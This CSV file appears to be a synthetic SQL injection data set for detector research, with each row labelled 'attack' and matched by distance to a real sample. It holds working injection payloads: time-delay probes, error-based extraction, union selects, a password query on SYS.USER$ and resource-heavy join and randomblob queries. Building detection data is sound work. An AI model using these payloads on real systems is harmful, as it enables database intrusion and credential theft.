id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000031,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",nearest_attack_euclidean,R004858,5.793149709177981
CTGAN_000032,attack,other,1'||  (  select 'bqhi' from dual where 7409  =  7409,nearest_attack_euclidean,R003068,5.267846973724859
CTGAN_000033,attack,union," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",nearest_attack_euclidean,R000156,18.088450230549686
CTGAN_000034,attack,boolean,"1'  )   where 3331  =  3331 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R008862,4.96677259199018
CTGAN_000035,attack,time,"1'||  (  select 'bccx' where 5881  =  5881 and elt  (  1210  =  1210,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R008629,19.0223249940537
CTGAN_000036,attack,boolean,"1""   )    )    as qhnb where 8302  =  8302 and   (  3020  =  3020  )  *6703--",nearest_attack_euclidean,R002543,4.0679958176854525
CTGAN_000037,attack,error,"1   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  2230  =  2230",nearest_attack_euclidean,R001526,15.06709198721811
CTGAN_000038,attack,union,"1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--",nearest_attack_euclidean,R006731,7.035527951007562
CTGAN_000039,attack,time,"1""  )   where 2922  =  2922 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R007308,10.060806868803029
CTGAN_000040,attack,error,"1',exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R005993,7.440546423836579
CTGAN_000041,attack,time,"1""   )    )    as vhrq where 1690  =  1690 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R008670,15.251843682657487
CTGAN_000042,attack,union,"-3960""   )    )    union all select 7813,7813,7813,7813,7813,7813--",nearest_attack_euclidean,R008354,8.027876566988569
CTGAN_000043,attack,union,"-2204'||  (  select 'bwae' from dual where 4884  =  4884 union all select 4884,4884,4884,4884,4884,4884,4884,4884,4884,4884#",nearest_attack_euclidean,R007480,51.564302282401826
CTGAN_000044,attack,time,1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  4574  =  4574,nearest_attack_euclidean,R007105,13.468638831708232
CTGAN_000045,attack,other,1   )    )    as syot where 1199  =  1199,nearest_attack_euclidean,R005149,4.866540019827319
CTGAN_000046,attack,other,"1,  (  select   (  case when   (  5217  =  5217  )   then 1 else 5217*  (  select 5217 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R007018,8.174949938535903
CTGAN_000047,attack,other, (  select   (  case when   (  6986  =  6986  )   then 6986 else 6986*  (  select 6986 from mysql.db  )   end   )    ) ,nearest_attack_euclidean,R005753,4.336939577543313
CTGAN_000048,attack,union,"-1949""   )    )    as urke where 8761  =  8761 union all select 8761,8761,8761,8761,8761,8761,8761#",nearest_attack_euclidean,R001862,13.558974963289954
CTGAN_000049,attack,boolean,"1' in boolean mode  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R004876,3.1839664410634447
CTGAN_000050,attack,other,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  ||'",nearest_attack_euclidean,R000813,10.794002978639503
CTGAN_000051,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000562,30.56471335764136
CTGAN_000052,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   # ogwe",nearest_attack_euclidean,R004355,6.675418722726589
CTGAN_000053,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R004622,4.764390329672072
CTGAN_000054,attack,boolean,and 1 in   (  select var from temp  )  --,nearest_attack_euclidean,R000138,4.275601229496895
CTGAN_000055,attack,other,1'   )    )    as xpmy where 5274  =  5274 rlike   (  select   (  case when   (  6252  =  7704  )   then 1 else 0x28 end   )    )   --,nearest_attack_euclidean,R001786,8.358387476866115
CTGAN_000056,attack,boolean,"1  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",nearest_attack_euclidean,R000799,5.359103042506777
CTGAN_000057,attack,other,1'+  (  select zpdf where 2938  =  2938,nearest_attack_euclidean,R002869,3.7622803002138823
CTGAN_000058,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R001703,4.260279022118031
CTGAN_000059,attack,union," select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000544,17.279380828167024
CTGAN_000060,attack,error,"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R006618,8.940992767351664
CTGAN_000061,attack,union," select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000544,16.93641854628716
CTGAN_000062,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'zizo' like 'zizo",nearest_attack_euclidean,R008550,6.259946687712398
CTGAN_000063,attack,time,1'||  (  select 'ypqa' where 1961  =  1961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R008213,9.876957008205476
CTGAN_000064,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R005507,5.84489008443867
CTGAN_000065,attack,time,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R005787,6.301379526060186
CTGAN_000066,attack,boolean,"-2241   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  6840  =  6840",nearest_attack_euclidean,R003842,5.821096351976985
CTGAN_000067,attack,other,select 'qqpjq'||  (  select   (  case when   (  2933  =  2933  )   then 1 else 0 end   )    )   ||'qzvzq',nearest_attack_euclidean,R004710,4.939263378607329
CTGAN_000068,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000061,28.13594618559117
CTGAN_000069,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,5.01450527635192
CTGAN_000070,attack,time,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""dplf"" like ""dplf",nearest_attack_euclidean,R002388,10.158458171076058
CTGAN_000071,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8503  =  8503",nearest_attack_euclidean,R002367,7.6072557537215175
CTGAN_000072,attack,union,1%'   )    )     )   union all select null--,nearest_attack_euclidean,R004611,13.096757053290315
CTGAN_000073,attack,error,"1'+  (  select mems where 5091  =  5091 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  +'",nearest_attack_euclidean,R003381,8.751598164655155
CTGAN_000074,attack,other," union   (  select NULL, NULL, NULL,    (  select @@version   )    )    --",nearest_attack_euclidean,R000594,12.725849243048566
CTGAN_000075,attack,other,1 where 7425  =  7425 rlike   (  select   (  case when   (  4056  =  3196  )   then 1 else 0x28 end   )    )   --,nearest_attack_euclidean,R004460,4.480251730382867
CTGAN_000076,attack,other,"1',  (  select   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  select 5154 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R005735,7.1361433796639995
CTGAN_000077,attack,other,""" or """" """,nearest_attack_euclidean,R000286,9.810954592515358
CTGAN_000078,attack,other," union   (  select NULL, NULL, NULL,    (  select @@version   )    )    --",nearest_attack_euclidean,R000594,13.161168912040937
CTGAN_000079,attack,boolean,or 1 --',nearest_attack_euclidean,R000044,6.164033578716888
CTGAN_000080,attack,union," select * from users where id  =  '1' union select ""[""_,version  (    )   -- 1'",nearest_attack_euclidean,R000629,19.416527520757803
CTGAN_000081,attack,union," select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000626,18.192471901124676
CTGAN_000082,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R005880,9.013221742760093
CTGAN_000083,attack,union,"1'||  (  select 'zdfo' from dual where 4288  =  4288 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R008472,26.046894216747916
CTGAN_000084,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'hvqt'  =  'hvqt",nearest_attack_euclidean,R006021,4.639218036724838
CTGAN_000085,attack,time,"1  )   as cnpv where 4902  =  4902 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R006318,5.634646326510607
CTGAN_000086,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  -- mwsm",nearest_attack_euclidean,R005173,11.452634059085558
CTGAN_000087,attack,error,"1',  (  select   (  case when   (  5777  =  5777  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R002980,7.099766984358009
CTGAN_000088,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",nearest_attack_euclidean,R003948,7.002093512846993
CTGAN_000089,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'tnvm' like 'tnvm",nearest_attack_euclidean,R004654,6.402711870219973
CTGAN_000090,attack,time,1'  )   as svtm where 7627  =  7627 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R006528,11.306052524097877
CTGAN_000091,attack,boolean,"1' in boolean mode  )   and elt  (  4249  =  4249,7259  )  #",nearest_attack_euclidean,R002099,4.222243520190444
CTGAN_000092,attack,other,"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )  ",nearest_attack_euclidean,R000468,13.158989013575761
CTGAN_000093,attack,other, (  select   (  case when   (  6986  =  6986  )   then 6986 else 6986*  (  select 6986 from mysql.db  )   end   )    ) ,nearest_attack_euclidean,R005753,4.342589825985589
CTGAN_000094,attack,other,"  (  select 1 from generate_series  (  9352,9352,case when   (  9352  =  9352  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R002435,8.393641822329554
CTGAN_000095,attack,boolean,"1 and make_set  (  8403  =  8403,8899  )  -- rbxf",nearest_attack_euclidean,R005396,4.458719951988603
CTGAN_000096,attack,time,"1   )    )    as hrks where 7637  =  7637 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R005941,7.730653286742024
CTGAN_000097,attack,union," select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000008,24.78286497683572
CTGAN_000098,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  PASSWORD   )    )    FROM SYS.USER$   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000613,5.329525477925946
CTGAN_000099,attack,union," select * from users where id  =  '1' union select ""[""_,version  (    )   -- 1'",nearest_attack_euclidean,R000629,17.799975526050655
CTGAN_000100,attack,other, union   (  select @@version  )   --,nearest_attack_euclidean,R000431,11.757674616079374
CTGAN_000101,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R001492,7.17142814197186
CTGAN_000102,attack,other,"1,  (  select   (  case when   (  2970  =  5830  )   then 1 else 2970*  (  select 2970 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R004470,7.98828743425042
CTGAN_000103,attack,other,select   (  case when   (  3773  =  3722  )   then 3773 else 3773*  (  select 3773 from mysql.db  )   end  )  #,nearest_attack_euclidean,R008482,7.358033295460799
CTGAN_000104,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R002761,14.265868571295652
CTGAN_000105,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,5.192787987628672
CTGAN_000106,attack,error,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R000773,8.526911767142977
CTGAN_000107,attack,boolean,"1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  # tcrm",nearest_attack_euclidean,R008546,7.949182372657188
CTGAN_000108,attack,union," select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000544,7.829173001204917
CTGAN_000109,attack,error,"exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R005922,7.223503225539398
CTGAN_000110,attack,union," select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000544,18.16913353913363
CTGAN_000111,attack,time,1'   )    )    as cpwx where 5378  =  5378 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R003512,13.468006939702537
CTGAN_000112,attack,other,"1',  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R006023,10.101329365318223
CTGAN_000113,attack,union," select * from users where id  =  1 or 1#""  (   union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000484,35.46848672128739
CTGAN_000114,attack,other,"1',  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R006023,8.926786509835729
CTGAN_000115,attack,error, (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7992  =  7992  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    ) ,nearest_attack_euclidean,R001239,8.662584735048583
CTGAN_000116,attack,boolean,"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",nearest_attack_euclidean,R000019,5.980402388538459
CTGAN_000117,attack,boolean,"1%""  )   and 8024  =  3560--",nearest_attack_euclidean,R000670,6.428090626226611
CTGAN_000118,attack,other, union   (  select @@version  )   --,nearest_attack_euclidean,R000431,7.951929699630353
CTGAN_000119,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001643,16.496848744028938
CTGAN_000120,attack,boolean,"1   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  5030  =  5030",nearest_attack_euclidean,R001646,4.442073103536749
CTGAN_000121,attack,union,"1'   )    )     )   union all select null,null,null,null,null--",nearest_attack_euclidean,R008241,8.718517855825581
CTGAN_000122,attack,error,"1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  3294  =  3294",nearest_attack_euclidean,R006241,8.41081826551017
CTGAN_000123,attack,error,"1' where 8083  =  8083 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R005575,8.579312548723154
CTGAN_000124,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R003923,11.778559473051459
CTGAN_000125,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000353,12.799047656757782
CTGAN_000126,attack,time,"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'mbxh' like 'mbxh",nearest_attack_euclidean,R007265,12.792682022540617
CTGAN_000127,attack,union," select * from users where id  =  '1' or @ 1  =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000494,9.451423185527817
CTGAN_000128,attack,union," select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000544,17.20106492263599
CTGAN_000129,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  PASSWORD   )    )    FROM SYS.USER$   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000613,6.590927851400664
CTGAN_000130,attack,boolean,-1468'   )    )     )   or 4875  =  6163#,nearest_attack_euclidean,R003248,6.174356338138531
CTGAN_000131,attack,time,"1'  )   as idqc where 5288  =  5288 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R008943,18.179831094186675
CTGAN_000132,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R008725,4.768898028100822
CTGAN_000133,attack,other,"  (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",nearest_attack_euclidean,R006514,5.900510753647731
CTGAN_000134,attack,union," select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000544,43.27764232592485
CTGAN_000135,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R008714,11.355281997121258
CTGAN_000136,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000061,15.946398491534401
CTGAN_000137,attack,union," select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000544,11.466805427153284
CTGAN_000138,attack,union,"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#",nearest_attack_euclidean,R001655,9.304482004676434
CTGAN_000139,attack,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R003019,7.666091432187887
CTGAN_000140,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  6051  =  6051",nearest_attack_euclidean,R001376,5.383959776109481
CTGAN_000141,attack,other, union   (  select @@version  )   --,nearest_attack_euclidean,R000431,11.988675668206021
CTGAN_000142,attack,boolean,and 1 in   (  select var from temp  )  --,nearest_attack_euclidean,R000138,3.43348117107161
CTGAN_000143,attack,error,"1""   )    )    as lfte where 3811  =  3811 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R006803,9.410632159162075
CTGAN_000144,attack,time,1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',nearest_attack_euclidean,R005935,20.394100895156665
CTGAN_000145,attack,other,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4#",nearest_attack_euclidean,R006805,6.610054828876648
CTGAN_000146,attack,other,1  )   as jmib where 8130  =  8130 rlike   (  select   (  case when   (  7885  =  3932  )   then 1 else 0x28 end   )    )   --,nearest_attack_euclidean,R006557,8.193474318671758
CTGAN_000147,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'kwhs' like 'kwhs",nearest_attack_euclidean,R000790,7.326250076092658
CTGAN_000148,attack,other,"select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   from dual--",nearest_attack_euclidean,R001818,7.681292390000379
